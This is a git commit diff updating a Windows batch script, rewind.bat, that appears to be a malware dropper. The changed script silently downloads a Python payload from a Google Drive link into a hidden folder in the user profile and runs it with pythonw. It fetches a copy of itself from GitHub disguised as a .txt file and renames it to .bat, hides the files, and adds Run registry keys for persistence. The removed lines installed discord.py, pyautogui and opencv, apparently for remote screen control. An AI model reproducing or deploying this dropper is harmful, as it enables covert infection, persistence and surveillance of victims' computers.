d5db0967123929f241b37a1ce3fac19c2012ecb3
Unyther <91031076+Unyther@users.noreply.github.com>
2025-02-07 18:37:38 +0100

    Update rewind.bat

--- rewind.bat
+++ rewind.bat
@@ -1,15 +1,5 @@
 @echo off
-
-where pythonw
-if "%errorlevel%" == "0" (
-	pip install discord.py pyautogui opencv-python numpy pillow requests
-	goto conf
-) else (
-	curl -o python-installer.exe https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe &&
-	python-installer.exe /quiet InstallAllUsers=0 PrependPath=1 &&
-	del python-installer.exe
-	goto end
-)
+	
 
 :conf
 IF EXIST "C:\Users\%USERNAME%\configuration\" (
@@ -20,13 +10,13 @@ IF EXIST "C:\Users\%USERNAME%\configuration\" (
 )
 
 :hote
-IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
-	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
+IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyz" (
+	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyz"
 	goto rewind_1
 ) ELSE (
-	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://drive.usercontent.google.com/download?id=1BWI_g0rYHTo2byBmz1ASoc6a3aH9tLSl&export=download&authuser=0&confirm=t&uuid=68837b1c-e076-4f9e-bfb0-764fb92212f6&at=AIrpjvMjI7TtfYSOANWXDDcgxurH:1736532294502"
-	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.pyw"
-	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
+	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyz" "https://drive.usercontent.google.com/download?id=1uT5XJGvanUxCfrqYj3Ga39mGXVOKCQVA&export=download&authuser=0&confirm=t&uuid=6fb57f32-3b23-45a4-a518-71105ecfc7e8&at=AIrpjvP7oaZpNPZr6TCmMyeYdnm5:1738753310639"
+	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.pyz"
+	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyz"
 	goto rewind_1
 )
 
@@ -34,9 +24,10 @@ IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
 IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
 	goto rewind_2
 ) ELSE (
-	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.bat"
+	curl -L -o "C:\Users\%USERNAME%\configuration\rewind.txt" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.txt"
+	rename "C:\Users\%USERNAME%\configuration\rewind.txt" "rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
-	attrib +s +h "C:\Users\%USERNAME%\configuration\rewind.bat"
+	attrib +h "C:\Users\%USERNAME%\configuration\rewind.bat"
 	goto rewind_2
 )
 
@@ -45,9 +36,10 @@ IF EXIST "C:\Users\%USERNAME%\rewind.bat" (
 	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
 	goto end
 ) ELSE (
-	COPY "C:\Users\%USERNAME%\configuration\rewind.bat" "C:\Users\%USERNAME%\"
-	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
-	attrib +s +h "C:\Users\%USERNAME%\rewind.bat"
+	set "FILE_TXT=C:\Users\%USERNAME%\rewind.txt"
+	curl -L -o "%FILE_TXT%" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.txt"
+	rename "%FILE_TXT%" "rewind.bat"
+	attrib +h "C:\Users\%USERNAME%\rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Rewind /t REG_SZ /d "C:\Users\%USERNAME%\rewind.bat" /f
 	goto end
 )
